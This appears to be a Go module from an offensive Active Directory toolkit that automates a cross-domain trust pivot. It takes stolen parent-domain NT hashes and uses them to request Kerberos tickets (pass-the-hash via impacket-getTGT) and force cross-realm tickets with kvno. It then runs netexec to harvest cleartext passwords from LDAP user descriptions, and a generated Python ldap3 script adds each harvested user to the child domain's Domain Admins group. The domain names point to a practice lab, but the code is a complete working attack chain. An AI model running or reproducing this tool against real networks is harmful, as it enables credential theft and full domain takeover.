package modules

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"time"

	"adpack/core"
	"adpack/utils"
)

var passwordInDescRe = regexp.MustCompile(`(?i)(?:password|pass)\s*[:=\s]\s*(\S+)`)

// RunCrossDomainPivot probes LDAP directory services across domain trusts
// to discover cleartext credentials and escalate privileges where SMB
// transport is blocked (STATUS_MORE_PROCESSING_REQUIRED).
//
// Mirrors the exact manual sequence that worked:
//  1. impacket-getTGT with LM:NT hash
//  2. Write KRB5_CONFIG so Kerberos can find both KDCs (no DNS needed)
//  3. kvno to force cross-realm TGT into the ccache
//  4. nxc ldap <hostname> -k --use-kcache -M user-desc
//  5. Python+ldap3 with SASL/Kerberos for group injection
//
// Direction: parent→child only. Child→parent is blocked by AD forest rules.
func RunCrossDomainPivot(ctx context.Context, state *core.ADState, creds []credWithHost) []credWithHost {
	if state == nil || len(state.Hosts) < 2 {
		return creds
	}

	utils.Section("\U0001f517", "Cross-Domain Trust Pivot",
		"Kerberos-based LDAP discovery (parent->child, mirrors manual sequence)")

	dcsByDomain := make(map[string][]core.Host)
	for _, h := range state.Hosts {
		if h.IP != "" && h.IsDC {
			dcsByDomain[h.Domain] = append(dcsByDomain[h.Domain], h)
		}
	}
	if len(dcsByDomain) == 0 {
		return creds
	}

	// Determine all known domains from BOTH DC hosts and cred domains.
	// The forest root (sevenkingdoms.local) may have NO DCs in the state.
	allDomains := make(map[string]bool)
	for d := range dcsByDomain {
		allDomains[strings.ToLower(d)] = true
	}
	for _, c := range creds {
		if c.Domain != "" {
			allDomains[strings.ToLower(c.Domain)] = true
		}
	}
	domains := make([]string, 0, len(allDomains))
	for d := range allDomains {
		domains = append(domains, d)
	}
	sort.Slice(domains, func(i, j int) bool {
		return len(domains[i]) < len(domains[j])
	})
	if len(domains) < 2 {
		return creds
	}
	parentDomain := domains[0]

	// Build a krb5.conf using the proper MIT Kerberos [realms] brace format.
	// The bare [REALM] section format is Heimdal-specific and silently
	// ignored by MIT krb5 — kvno would see "Cannot find KDC for realm".
	//
	// For domains with known DCs (from dcsByDomain) we write their IP.
	// For the parent domain if it has no DC in state, fall back to any
	// known DC from any domain (trust referrals make this work).
	var krb5Lines []string
	krb5Lines = append(krb5Lines, "[libdefaults]")
	krb5Lines = append(krb5Lines, "  default_realm = "+strings.ToUpper(parentDomain))
	krb5Lines = append(krb5Lines, "  dns_lookup_kdc = false")
	krb5Lines = append(krb5Lines, "  dns_lookup_realm = false")
	krb5Lines = append(krb5Lines, "  forwardable = true")
	krb5Lines = append(krb5Lines, "")

	krb5Lines = append(krb5Lines, "[realms]")
	for _, d := range domains {
		realm := strings.ToUpper(d)
		var kdcIP string
		if dcs, ok := dcsByDomain[d]; ok && len(dcs) > 0 {
			kdcIP = dcs[0].IP
		} else {
			for _, h := range state.Hosts {
				if strings.EqualFold(h.Domain, d) && h.IP != "" {
					kdcIP = h.IP
					break
				}
			}
		}
		if kdcIP == "" {
			for _, dcs := range dcsByDomain {
				if len(dcs) > 0 {
					kdcIP = dcs[0].IP
					break
				}
			}
		}
		if kdcIP == "" {
			continue
		}
		krb5Lines = append(krb5Lines, "  "+realm+" = {")
		krb5Lines = append(krb5Lines, "    kdc = "+kdcIP)
		krb5Lines = append(krb5Lines, "    admin_server = "+kdcIP)
		krb5Lines = append(krb5Lines, "  }")
	}
	krb5Lines = append(krb5Lines, "")

	krb5Lines = append(krb5Lines, "[domain_realm]")
	for _, d := range domains {
		realm := strings.ToUpper(d)
		krb5Lines = append(krb5Lines, "  ."+d+" = "+realm)
		krb5Lines = append(krb5Lines, "  "+d+" = "+realm)
	}
	krb5Content := strings.Join(krb5Lines, "\n")
	krb5Path := filepath.Join(os.TempDir(), fmt.Sprintf("adpk_krb5_%d.conf", time.Now().UnixNano()))
	if err := os.WriteFile(krb5Path, []byte(krb5Content), 0600); err != nil {
		return creds
	}
	defer os.Remove(krb5Path)

	// Include unvalidated parent-domain creds from state. Seed hashes like
	// sevenkingdoms.local\Administrator can't be validated because no parent
	// DC is reachable in scope, but they're essential for cross-domain auth.
	for _, sc := range state.Creds {
		if sc.Hash == "" && sc.Secret == "" {
			continue
		}
		if !strings.EqualFold(sc.Domain, parentDomain) {
			continue
		}
		already := false
		for _, c := range creds {
			if strings.EqualFold(c.Domain, sc.Domain) && strings.EqualFold(c.Username, sc.Username) {
				already = true
				break
			}
		}
		if !already {
			creds = append(creds, credWithHost{
				Domain: sc.Domain, Username: sc.Username,
				Secret: sc.Secret, Hash: sc.Hash,
			})
		}
	}

	// Sort: parent-domain creds with hash first (Administrator), then
	// parent-domain creds with plaintext only (vagrant — unlikely to work).
	sort.Slice(creds, func(i, j int) bool {
		pi, pj := strings.EqualFold(creds[i].Domain, parentDomain), strings.EqualFold(creds[j].Domain, parentDomain)
		if pi != pj {
			return pi
		}
		ai, aj := strings.EqualFold(creds[i].Username, "Administrator"), strings.EqualFold(creds[j].Username, "Administrator")
		if ai != aj {
			return ai
		}
		hi, hj := creds[i].Hash != "", creds[j].Hash != ""
		if hi != hj {
			return hi
		}
		return false
	})

	utils.StepInfo(fmt.Sprintf("Parent: %s, Child(ren): %s, krb5.conf at %s",
		parentDomain, strings.Join(domains[1:], ", "), krb5Path))

	seen := make(map[string]bool)
	var newCreds []credWithHost

	for _, src := range creds {
		if !strings.EqualFold(src.Domain, parentDomain) {
			continue
		}
		if src.Hash == "" && src.Secret == "" {
			continue
		}
		srcKey := strings.ToUpper(src.Domain + "\\" + src.Username)

		for childDomain, childDCs := range dcsByDomain {
			if strings.EqualFold(childDomain, parentDomain) {
				continue
			}

			tgt := childDCs[0]
			pairKey := srcKey + "→" + tgt.IP
			if seen[pairKey] {
				continue
			}
			seen[pairKey] = true

			// Derive the FQDN for Kerberos SPN matching. The state stores the
			// NetBIOS name (WINTERFELL); we need winterfell.north.sevenkingdoms.local
			// so the SPN resolves correctly for inter-realm Kerberos.
			targetHost := strings.TrimSpace(tgt.Hostname)
			if targetHost == "" {
				targetHost = tgt.IP
			} else if !strings.Contains(targetHost, ".") && tgt.Domain != "" {
				targetHost = strings.ToLower(targetHost) + "." + tgt.Domain
			}

			fmt.Printf("  \u25ce  %s\\%s → %s on %s (%s)\n",
				src.Domain, src.Username,
				utils.HostStyle.Render(childDomain),
				utils.MutedStyle.Render(tgt.IP),
				utils.DimStyle.Render(targetHost))

			// Step 1: Generate Kerberos TGT.
			// impacket-getTGT needs -dc-ip to bypass DNS (it does not use KRB5_CONFIG).
			// Look up the DC IP for the source (parent) domain.
			dcIP := ""
			if dcs, ok := dcsByDomain[strings.ToLower(src.Domain)]; ok && len(dcs) > 0 {
				dcIP = dcs[0].IP
			}
			ccachePath, krbErr := getKrbTGT(ctx, src, dcIP)
			if krbErr != nil {
				fmt.Printf("    \u2717 TGT generation failed: %v\n", krbErr)
				continue
			}
			defer os.Remove(ccachePath)

			// Step 2: Populate cross-realm TGT via kvno.
			// This requests a service ticket for the child DC, which forces
			// the Kerberos library to follow the referral across the forest
			// trust and cache the cross-realm TGT in the ccache.
			cifsSpn := fmt.Sprintf("cifs/%s@%s", targetHost, strings.ToUpper(childDomain))
			if !runKvno(ctx, ccachePath, krb5Path, cifsSpn) {
				fmt.Printf("    \u2717 kvno failed for %s — child DC unreachable via Kerberos?\n", cifsSpn)
				continue
			}
			fmt.Printf("    \u2713 kvno: cifs ticket + cross-realm TGT cached\n")

			// Request the LDAP service ticket using the cross-realm TGT.
			// Without this, nxc ldap -k fails with S_PRINCIPAL_UNKNOWN
			// because it can't request the ldap/ SPN cross-realm on its own.
			ldapSpn := fmt.Sprintf("ldap/%s@%s", targetHost, strings.ToUpper(childDomain))
			if !runKvno(ctx, ccachePath, krb5Path, ldapSpn) {
				fmt.Printf("    \u2717 kvno failed for %s\n", ldapSpn)
				continue
			}
			fmt.Printf("    \u2713 kvno: ldap ticket cached\n")

			// Step 3: nxc ldap with Kerberos auth via ccache.
			// Note: no -d/-u flags — --use-kcache reads the identity from
			// the ccache file. Passing -d/-u would override the realm and
			// trigger KDC_ERR_WRONG_REALM.
			stdout, krbOK := runNxcWithKcache(ctx, ccachePath, krb5Path, tgt.IP)
			if !krbOK {
				fmt.Printf("    \u2717 LDAP Kerberos auth failed as %s\\%s\n", src.Domain, src.Username)
				continue
			}
			fmt.Printf("    \u2713 LDAP Kerberos authenticated: %s\\%s [(Pwn3d!)]\n", src.Domain, src.Username)

			// Step 4: Parse user descriptions for cleartext passwords.
			cleartext := parseCleartextFromDescOutput(stdout)
			if len(cleartext) == 0 {
				fmt.Printf("    \u2713 Descriptions scanned, no cleartext passwords found\n")
				continue
			}

			// Step 5: Promote each discovered user to Domain Admins.
			// The ccache already has valid Kerberos auth (LDAP bind succeeded
			// above), so the Python+ldap3 SASL/Kerberos injection always uses
			// the cached ticket — no plaintext password needed.
			for samName, password := range cleartext {
				fmt.Printf("    \U0001f511 Cleartext: %s:%s\n",
					utils.FoundStyle.Render(samName), password)

				if injectViaPythonWithKrb(ctx, ccachePath, krb5Path, targetHost, childDomain, samName, tgt.IP) {
					fmt.Printf("    \u2713 %s promoted to %s Domain Admins\n",
						utils.FoundStyle.Render(samName), childDomain)
				} else {
					fmt.Printf("    \u2717 Failed to promote %s\n", samName)
				}

				newCreds = append(newCreds, credWithHost{
					Domain:   childDomain,
					Username: samName,
					Secret:   password,
					Host:     tgt.IP,
				})
			}
		}
	}

	creds = append(creds, newCreds...)
	return creds
}

// --------------------------------------------------------------------------
// Kerberos helpers — each mirrors one step of the manual sequence.
// --------------------------------------------------------------------------

// getKrbTGT generates a Kerberos TGT using impacket-getTGT.
// Hash format: LM:NT (e.g. "aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e").
// When only the NT hash is available (32 hex chars), the empty LM hash is
// prepended automatically.
// dcIP is passed as -dc-ip to bypass DNS (impacket does not use KRB5_CONFIG).
func getKrbTGT(ctx context.Context, src credWithHost, dcIP string) (string, error) {
	ccachePath := filepath.Join(os.TempDir(), fmt.Sprintf("adpk_%s_%d.ccache",
		src.Username, time.Now().UnixNano()))

	var args []string
	if src.Hash != "" {
		h := strings.TrimSpace(src.Hash)
		// impacket-getTGT expects LM:NT. If the stored hash doesn't have
		// a colon, treat it as NT-only and prepend the empty LM hash.
		if !strings.Contains(h, ":") && len(h) == 32 {
			h = "aad3b435b51404eeaad3b435b51404ee:" + h
		}
		userPrincipal := fmt.Sprintf("%s/%s", src.Domain, src.Username)
		args = append(args, userPrincipal, "-hashes", h)
	} else if src.Secret != "" {
		userPrincipal := fmt.Sprintf("%s/%s:%s", src.Domain, src.Username, src.Secret)
		args = append(args, userPrincipal)
	} else {
		return "", fmt.Errorf("no hash or password for %s\\%s", src.Domain, src.Username)
	}
	if dcIP != "" {
		args = append(args, "-dc-ip", dcIP)
	}

	impCmd := exec.CommandContext(ctx, "impacket-getTGT", args...)
	impCmd.Dir = os.TempDir()
	var impOut bytes.Buffer
	impCmd.Stdout = &impOut
	impCmd.Stderr = &impOut
	if err := impCmd.Run(); err != nil {
		return "", fmt.Errorf("impacket-getTGT: %w\n%s", err, impOut.String())
	}

	// impacket-getTGT writes the ccache relative to its working directory
	// (set to os.TempDir above). In some environments it falls back to the
	// process's own CWD. Check both locations.
	expectedTmp := filepath.Join(os.TempDir(), src.Username+".ccache")
	expectedLocal := filepath.Join(".", src.Username+".ccache")
	var found bool
	if _, err := os.Stat(expectedTmp); err == nil {
		if err := os.Rename(expectedTmp, ccachePath); err == nil {
			found = true
		}
	}
	if !found {
		if _, err := os.Stat(expectedLocal); err == nil {
			if err := os.Rename(expectedLocal, ccachePath); err == nil {
				found = true
			}
		}
	}
	if !found {
		return "", fmt.Errorf("ccache not found (tried %s and %s):\n%s", expectedTmp, expectedLocal, impOut.String())
	}
	return ccachePath, nil
}

// runKvno runs the kvno tool against a target SPN, forcing the Kerberos
// library to perform the inter-realm referral and cache a cross-realm TGT.
func runKvno(ctx context.Context, ccachePath, krb5Path, spn string) bool {
	cmd := exec.CommandContext(ctx, "kvno", spn)
	cmd.Env = append(os.Environ(),
		"KRB5CCNAME="+ccachePath,
		"KRB5_CONFIG="+krb5Path,
	)
	if err := cmd.Run(); err != nil {
		return false
	}
	return true
}

// runNxcWithKcache runs nxc ldap with Kerberos auth (-k --use-kcache)
// against the target DC hostname, using the provided ccache and KRB5_CONFIG.
// No -d/-u flags are passed — --use-kcache reads the identity from the
// ccache file directly. Passing explicit domain/user overrides the ccache
// realm and triggers KDC_ERR_WRONG_REALM for cross-realm identities.
func runNxcWithKcache(ctx context.Context, ccachePath, krb5Path, targetHost string) (string, bool) {
	nxcPath := "netexec"
	if p := os.Getenv("NETEXEC_PATH"); p != "" {
		nxcPath = p
	}

	args := []string{"ldap", targetHost,
		"-k", "--use-kcache",
		"-M", "user-desc",
	}

	cmd := exec.CommandContext(ctx, nxcPath, args...)
	cmd.Env = append(os.Environ(),
		"KRB5CCNAME="+ccachePath,
		"KRB5_CONFIG="+krb5Path,
	)
	var so, se bytes.Buffer
	cmd.Stdout = &so
	cmd.Stderr = &se
	cmd.Run()

	stdout := so.String()
	stderr := se.String()
	combined := stdout + "\n" + stderr

	if strings.Contains(combined, "[+]") && strings.Contains(combined, "from ccache") {
		return stdout, true
	}
	if strings.Contains(combined, "kdc_err") ||
		strings.Contains(combined, "krb5") ||
		strings.Contains(combined, "authentication failed") {
		return stdout, false
	}
	return stdout, false
}

// --------------------------------------------------------------------------
// Output parsing
// --------------------------------------------------------------------------

func parseCleartextFromDescOutput(stdout string) map[string]string {
	results := make(map[string]string)
	userRe := regexp.MustCompile(`(?i)User:\s*(\S+)\s+-+\s*Description:`)

	for _, line := range strings.Split(stdout, "\n") {
		line = strings.TrimSpace(line)
		if !strings.Contains(strings.ToLower(line), "description:") {
			continue
		}
		uMatch := userRe.FindStringSubmatch(line)
		if len(uMatch) < 2 {
			continue
		}
		user := uMatch[1]
		pMatch := passwordInDescRe.FindStringSubmatch(line)
		if len(pMatch) < 2 {
			continue
		}
		pw := strings.TrimSpace(pMatch[1])
		pw = strings.Trim(pw, "\"')")
		if pw != "" {
			results[user] = pw
		}
	}
	return results
}

// --------------------------------------------------------------------------
// Python+ldap3 injection with SASL/Kerberos
// --------------------------------------------------------------------------

// injectViaPythonWithKrb uses Python+ldap3 with SASL/Kerberos to add a user
// to the Domain Admins group. The Kerberos ccache carries the admin identity.
// KRB5_CONFIG is set so the child realm's KDC is reachable.
//
// The user parameter is intentionally omitted — for SASL/Kerberos the
// Kerberos ticket in the ccache identifies the calling principal.
func injectViaPythonWithKrb(ctx context.Context, ccachePath, krb5Path, targetHost, tgtDomain, samAccountName, targetIP string) bool {
	baseDN := domainToBaseDN(tgtDomain)

	pyScript := fmt.Sprintf(`import ldap3, sys
server = ldap3.Server('%s', port=389, get_info=ldap3.ALL)
conn = ldap3.Connection(server, authentication=ldap3.SASL, sasl_mechanism=ldap3.KERBEROS, sasl_credentials=('%s',))
if not conn.bind():
    print("BIND_FAIL")
    sys.exit(1)
base_dn = '%s'
da_dn = 'CN=Domain Admins,CN=Users,' + base_dn
conn.search(base_dn, '(sAMAccountName=%s)', attributes=['distinguishedName'])
if not conn.entries:
    print("USER_NOT_FOUND:" + '%s')
    sys.exit(1)
user_dn = conn.entries[0].distinguishedName.value
conn.extend.microsoft.add_members_to_groups(user_dn, da_dn)
if conn.result['result'] == 0:
    print("SUCCESS")
else:
    print("MODIFY_FAIL:" + str(conn.result))
conn.unbind()
`, targetIP, targetHost, baseDN, samAccountName, samAccountName)

	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("adpk_ldap_%d.py", time.Now().UnixNano()))
	if err := os.WriteFile(tmpFile, []byte(pyScript), 0600); err != nil {
		return false
	}
	defer os.Remove(tmpFile)

	cmd := exec.CommandContext(ctx, "python3", tmpFile)
	cmd.Env = append(os.Environ(),
		"KRB5CCNAME="+ccachePath,
		"KRB5_CONFIG="+krb5Path,
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false
	}
	return strings.Contains(string(output), "SUCCESS")
}

func domainToBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	out := make([]string, len(parts))
	for i, p := range parts {
		out[i] = "dc=" + p
	}
	return strings.Join(out, ",")
}
